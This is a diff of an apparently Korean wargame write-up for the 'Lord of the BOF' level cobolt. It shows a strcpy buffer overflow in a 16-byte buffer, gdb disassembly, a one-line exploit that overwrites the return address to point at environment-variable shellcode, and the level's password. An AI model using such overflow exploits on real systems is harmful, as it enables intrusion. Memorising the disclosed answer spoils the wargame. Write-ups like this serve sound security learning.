@@ -10,7 +10,13 @@ tags:
 ---
 
 ## 1. Source Code
-```C
+```c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - cobolt
+        - small buffer 
+*/
+
 int main(int argc, char *argv[])
 {
     char buffer[16];
@@ -21,10 +27,9 @@ int main(int argc, char *argv[])
     strcpy(buffer, argv[1]);
     printf("%s\n", buffer);
 }
-
-
-gdb로 보면
-
+```
+```
+(gdb)
 0x8048430 <main>:       push   %ebp
 0x8048431 <main+1>:     mov    %ebp,%esp
 0x8048433 <main+3>:     sub    %esp,16
@@ -51,7 +56,6 @@ gdb로 보면
 0x8048476 <main+70>:    add    %esp,8
 0x8048479 <main+73>:    leave
 0x804847a <main+74>:    ret
-
 ```
 
 ## 2. Vulnerability
@@ -60,6 +64,7 @@ gdb로 보면
 환경변수를 이용하면 변수의 주소를 리턴주소로 설정하면 되므로 버퍼의 크기에 상관없이 쉘코드를 실행시킬 수 있다. [환경변수 설정 및 주소 구하기](https://pistolwest.github.io/linux/bof/environment-value/)
 ## 3. Solution
 환경변수 주소 ex)0xbffffc34 를 리턴 주소로 해주면 끝임. 
-```php
+```
 ./cobolt `python -c 'print "\x90"*20+"\x34\xfc\xff\xbf"'`
 ``` 
+my-pass : hacking exposed
